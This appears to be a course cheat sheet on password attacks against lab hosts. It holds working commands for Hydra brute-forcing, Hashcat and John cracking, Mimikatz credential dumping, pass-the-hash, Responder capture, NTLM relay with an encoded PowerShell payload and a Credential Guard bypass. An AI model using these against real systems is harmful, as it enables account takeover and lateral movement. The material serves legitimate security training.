# Password Attacks - Cheat Sheet & Walkthrough

## Table of Contents
1. [Network Service Login Attacks](#1-network-service-login-attacks)
2. [Password Cracking Fundamentals](#2-password-cracking-fundamentals)
3. [Windows Password Attacks](#3-windows-password-attacks)
4. [Quick Reference](#4-quick-reference)

---

## 1. Network Service Login Attacks

### 1.1 Dictionary Attacks with Hydra

#### What is Hydra?
> THC-Hydra is a tool for performing dictionary attacks against various network services and protocols.

#### Basic Hydra Syntax
```bash
hydra [options] [target] [protocol]
```

#### Key Hydra Options

| Option | Purpose | Example |
|--------|---------|---------|
| `-l` | Single username | `-l admin` |
| `-L` | Username list | `-L users.txt` |
| `-p` | Single password | `-p password123` |
| `-P` | Password list | `-P /path/to/wordlist` |
| `-s` | Port number | `-s 2222` |
| `-t` | Threads | `-t 16` |
| `-vV` | Verbose | Show attempts |

---

### 1.2 SSH Dictionary Attack

#### Example: Attacking SSH on Non-Standard Port
```bash
# Check if SSH is running
nmap -sV -p 2222 192.168.50.201

# Attack SSH with wordlist
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

**Output**:
```
[2222][ssh] host: 192.168.50.201   login: george   password: chocolate
```

**Common Wordlist Locations**:
```bash
/usr/share/wordlists/rockyou.txt.gz  # Compressed (unzip first)
/usr/share/wordlists/dirb/           # Directory brute force wordlists
/usr/share/wordlists/fasttrack.txt   # Common passwords
/usr/share/wordlists/nmap.lst        # Nmap default wordlist
```

---

### 1.3 RDP Password Spraying

#### What is Password Spraying?
> Trying a single password against multiple usernames (reverse of normal brute force).

#### Example: Spraying RDP
```bash
# Add usernames to wordlist
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

# Spray one password against many usernames
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

#### Why Password Spraying Works
- Avoids account lockouts
- Leverages password reuse
- Common passwords like `CompanyName2024!`

---

### 1.4 HTTP POST Login Form

#### Hydra HTTP POST Syntax
```bash
hydra -l USER -P WORDLIST TARGET_IP http-post-form "/PATH:POST_DATA:FAILURE_STRING"
```

#### Example: TinyFileManager Attack
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

#### Finding POST Parameters

**Step 1: Intercept Login with Burp**
```
POST /index.php HTTP/1.1
Host: 192.168.50.201
Content-Type: application/x-www-form-urlencoded

fm_usr=user&fm_pwd=password
```

**Step 2: Identify Failure Message**
```
Login failed. Invalid username or password
```

**Step 3: Build Hydra Command**
- Replace password with `^PASS^`
- Provide failure identifier

---

## 2. Password Cracking Fundamentals

### 2.1 Encryption vs Hashing

| Feature | Encryption | Hashing |
|---------|------------|---------|
| **Reversible** | Yes (with key) | No (one-way) |
| **Key Required** | Yes | No |
| **Output** | Ciphertext | Hash/Digest |
| **Purpose** | Confidentiality | Integrity/Authentication |
| **Example** | AES, RSA | MD5, SHA-256 |

#### Symmetric Encryption
- Same key for encryption/decryption
- Key must be shared securely
- Example: AES

#### Asymmetric Encryption
- Key pair: Public + Private
- Public shares, Private secret
- Example: RSA

#### Cryptographic Hash Functions
- One-way function
- Same input → Same output
- (Statistically) Unique
- Example: MD5, SHA1, SHA-256

---

### 2.2 Password Cracking Tools

| Tool | Best For | Environment |
|------|----------|-------------|
| **Hashcat** | GPU cracking, fast hashes | GPU/CPU |
| **John the Ripper** | CPU cracking, older systems | CPU |
| **Hashid** | Identify hash types | - |
| **hash-identifier** | Identify hash types | - |

---

### 2.3 Calculating Cracking Time

#### Keyspace Calculation
```
Keyspace = Charset ^ Length
```

**Example: 62 character set (a-z, A-Z, 0-9)**
```bash
# Charset size
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
# Output: 62

# Keyspace for 5 characters
python3 -c "print(62**5)"
# Output: 916132832
```

#### Cracking Time Formula
```
Time (seconds) = Keyspace / Hash Rate (H/s)
```

#### Benchmark Hashcat
```bash
# CPU benchmark
hashcat -b

# GPU benchmark
hashcat.exe -b  # Windows
```

#### Hash Rates Comparison

| Algorithm | CPU (MH/s) | GPU (MH/s) | Ratio |
|-----------|------------|------------|-------|
| MD5 | 450.8 | 68,185.1 | 151x |
| SHA1 | 298.3 | 21,528.2 | 72x |
| SHA-256 | 134.2 | 9,276.3 | 69x |

#### Password Length Impact

| Length | Keyspace | GPU Time (SHA-256) |
|--------|----------|-------------------|
| 5 | 916M | < 1 second |
| 8 | 218T | 6.5 hours |
| 10 | 839P | 2.8 years |

---

### 2.4 Rule-Based Attacks

#### Why Use Rules?
- Wordlists often don't match password policies
- Rules mutate passwords to fit policies
- Significantly expands coverage

#### Common Rule Functions

| Function | Effect | Example |
|----------|--------|---------|
| `c` | Capitalize first letter | `password` → `Password` |
| `$X` | Append character X | `$1` → `password1` |
| `^X` | Prepend character X | `^A` → `Apassword` |
| `u` | All uppercase | `password` → `PASSWORD` |
| `l` | All lowercase | `PASSWORD` → `password` |
| `r` | Reverse string | `password` → `drowssap` |
| `d` | Duplicate | `pass` → `passpass` |

#### Rule File Examples

**Single rule (space separated)**:
```
c $1 $!
```
Result: `password` → `Password1!`

**Multiple rules (line separated)**:
```
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

#### Using Rules with Hashcat
```bash
hashcat -m 0 hashes.txt rockyou.txt -r demo.rule --force
```

#### Predefined Rule Files
```bash
/usr/share/hashcat/rules/
├── best66.rule       # 66 effective rules
├── d3ad0ne.rule      # Popular rule set
├── dive.rule         # Extensive rules
├── rockyou-30000.rule # Optimized for rockyou
└── T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
```

---

### 2.5 Cracking Methodology

#### 5-Step Process
```
1. Extract Hashes
2. Format Hashes
3. Calculate Cracking Time
4. Prepare Wordlist
5. Attack the Hash
```

#### Step 1: Extract Hashes
- From databases (SQL dumps)
- From SAM files (Windows)
- From etc/shadow (Linux)
- From password manager files
- From network capture

#### Step 2: Format Hashes

**Hash Identification**:
```bash
# Method 1: hashid
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# Method 2: hash-identifier
hash-identifier
```

**Common Formats**:
- NTLM: `32 hex characters`
- MD5: `32 hex characters`
- SHA-256: `64 hex characters`
- $1$: MD5 crypt
- $6$: SHA-512 crypt
- $2y$: bcrypt

#### Step 3: Calculate Time
```bash
# Estimated time calculation
python3 -c "print(KEYSPACE / HASH_RATE / 60)"  # Minutes
```

#### Step 4: Prepare Wordlist
- Use rockyou.txt as base
- Add company-specific words
- Create custom rules
- Include known passwords

#### Step 5: Attack Hash
```bash
# Hashcat
hashcat -m MODE hashes.txt wordlist.txt -r rules.rule --force

# John the Ripper
john --wordlist=wordlist.txt --rules=MyRule hash.txt
```

---

### 2.6 Password Manager (KeePass)

#### Step 1: Locate Database
```powershell
# Windows search for .kdbx files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

#### Step 2: Format Hash
```bash
keepass2john Database.kdbx > keepass.hash

# Remove "Database:" prefix
# Hash should start with $keepass$
```

#### Step 3: Identify Mode
```bash
hashcat --help | grep -i keepass
# 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)
```

#### Step 4: Crack
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

---

### 2.7 SSH Private Key Passphrase

#### Step 1: Extract Key
```bash
# Download id_rsa from target
# Set permissions
chmod 600 id_rsa
```

#### Step 2: Format Hash
```bash
ssh2john id_rsa > ssh.hash

# Remove "id_rsa:" prefix
# Check cipher type ($6$ = SHA-512)
```

#### Step 3: Identify Mode
```bash
hashcat --help | grep -i "ssh"
# 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)
```

#### Step 4: John the Ripper (when Hashcat fails)
```bash
# Add rule to /etc/john/john.conf
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

# Crack with John
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

---

## 3. Windows Password Attacks

### 3.1 NTLM vs Net-NTLMv2

| Feature | NTLM | Net-NTLMv2 |
|---------|------|------------|
| **Where Stored** | SAM database | Network authentication |
| **Usage** | Local authentication | Network authentication |
| **Cracking** | Possible | Possible |
| **Pass-the-Hash** | Yes | No |
| **Relay** | No | Yes |

---

### 3.2 Extracting NTLM Hashes

#### Using Mimikatz

**Step 1: Run as Administrator**
```powershell
# Start PowerShell as Admin
.\mimikatz.exe
```

**Step 2: Enable Debug Privileges**
```
mimikatz # privilege::debug
```

**Step 3: Elevate to SYSTEM**
```
mimikatz # token::elevate
```

**Step 4: Dump SAM**
```
mimikatz # lsadump::sam
```

**Output**:
```
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```

#### Cracking NTLM Hash
```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

---

### 3.3 Pass the Hash (PtH)

#### What is Pass-the-Hash?
> Using the NTLM hash itself as authentication (no need to crack).

#### Tools Supporting PtH
- `smbclient` (SMB file access)
- `impacket-psexec` (Command execution)
- `impacket-wmiexec` (Command execution)
- `Mimikatz` (Local authentication)
- `CrackMapExec` (Network authentication)

#### Example: SMB Access
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

#### Example: Command Execution (psexec)
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

#### Example: Command Execution (wmiexec)
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

#### Important: UAC Remote Restrictions
- Local Administrator accounts only (RID 500)
- Other admin accounts won't work remotely
- Need UAC disabled for other accounts

---

### 3.4 Capturing Net-NTLMv2 with Responder

#### Step 1: Start Responder
```bash
# Find interface
ip a

# Start Responder
sudo responder -I tap0
```

#### Step 2: Force Authentication
```cmd
# From target (bind shell)
dir \\192.168.119.2\test
```

#### Step 3: Capture Hash
```
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000...
```

#### Step 4: Identify Mode
```bash
hashcat --help | grep -i "ntlm"
# 5600 | NetNTLMv2
```

#### Step 5: Crack
```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

---

### 3.5 Relaying Net-NTLMv2

#### What is Relaying?
> Forward captured authentication to another target.

#### ntlmrelayx Setup
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc BASE64_PAYLOAD"
```

#### Attack Flow
```
1. Target authenticates to attacker (dir \\attacker\test)
2. ntlmrelayx receives authentication
3. Forwards to target system
4. Executes command as relayed user
```

#### Requirements
- User must exist on target
- User must have admin privileges (for command execution)
- UAC remote restrictions disabled (unless using RID 500)

---

### 3.6 Windows Credential Guard Bypass

#### What is Credential Guard?
- Uses Virtualization-Based Security (VBS)
- Stores credentials in isolated memory (VTL1)
- Blocks Mimikatz from reading domain hashes

#### Check if Enabled
```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
```

#### Bypass with SSP Injection

**Step 1: Inject SSP**
```
mimikatz # privilege::debug
mimikatz # misc::memssp
```

**Step 2: Wait for Login**
- Users log in to the machine
- Credentials captured

**Step 3: View Captured Credentials**
```cmd
type C:\Windows\System32\mimilsa.log
```

**Example Output**:
```
[00000000:00af2311] CORP\Administrator  QWERTY123!@#
```

---

## 4. Quick Reference

### Commands Quick Reference

#### Hydra Commands
```bash
# SSH
hydra -l user -P wordlist.txt -s PORT ssh://TARGET

# RDP (password spray)
hydra -L users.txt -p password rdp://TARGET

# HTTP POST
hydra -l user -P wordlist.txt TARGET http-post-form "/path:data:fail"
```

#### Hashcat Commands
```bash
# NTLM
hashcat -m 1000 hash.txt wordlist.txt -r rules.rule --force

# Net-NTLMv2
hashcat -m 5600 hash.txt wordlist.txt --force

# KeePass
hashcat -m 13400 hash.txt wordlist.txt -r rules.rule --force

# SSH Private Key
hashcat -m 22921 hash.txt wordlist.txt --force
```

#### John the Ripper
```bash
# Add rule to /etc/john/john.conf
[List.Rules:MyRule]
c $1 $3 $7 $!

# Run john
john --wordlist=wordlist.txt --rules=MyRule hash.txt
```

#### Mimikatz Commands
```
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords
misc::memssp
```

### Hash Modes Reference

| Hash Type | Mode | Example |
|-----------|------|---------|
| MD5 | 0 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| NTLM | 1000 | `3ae8e5f0ffabb3a627672e1600f1ba10` |
| Net-NTLMv2 | 5600 | `username::domain:...` |
| SHA-256 | 1400 | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8` |
| KeePass | 13400 | `$keepass$...` |
| SSH Key ($6$) | 22921 | `$sshng$6$...` |

### Attack Flow Charts

#### Network Service Attack
```
Information Gathering → Identify Service → Get Credentials → Gain Access
         ↓                    ↓                ↓              ↓
    Username?           SSH/RDP/HTTP     Hydra Attack   Shell/Connect
```

#### Password Cracking
```
Extract Hash → Identify Type → Format → Crack → Access
     ↓             ↓            ↓         ↓       ↓
    SAM/DB     hashid      JtR/Hashcat  Rules   Password
```

#### Windows Attack Chain
```
Get Initial Shell → Extract Hashes → Crack/Pass → Access New Systems
       ↓                 ↓              ↓              ↓
    Low Priv        NTLM/Net-NTLM   PtH/Relay     Lateral Movement
```

### Wordlist Locations

```bash
/usr/share/wordlists/
├── rockyou.txt         # 14M passwords (unzip first)
├── fasttrack.txt       # Common passwords
├── dirb/
│   ├── common.txt      # Directory brute force
│   └── others/
│       └── names.txt   # Username wordlist
└── nmap.lst            # Nmap default

/usr/share/hashcat/rules/
├── best66.rule         # 66 effective rules
├── d3ad0ne.rule        # Popular rule set
└── rockyou-30000.rule  # Optimized for rockyou
```

### Key Takeaways

| Concept               | Key Point                                   |
| --------------------- | ------------------------------------------- |
| **Hydra**             | Dictionary attacks against network services |
| **Password Spraying** | One password, many users                    |
| **Rule-Based Attack** | Mutate wordlists for password policies      |
| **Cracking Time**     | Keyspace / Hash Rate                        |
| **NTLM**              | Local account hashes (can PtH)              |
| **Net-NTLMv2**        | Network auth hashes (can crack/relay)       |
| **Responder**         | Capture Net-NTLMv2 hashes                   |
| **Credential Guard**  | VBS-based mitigation against Mimikatz       |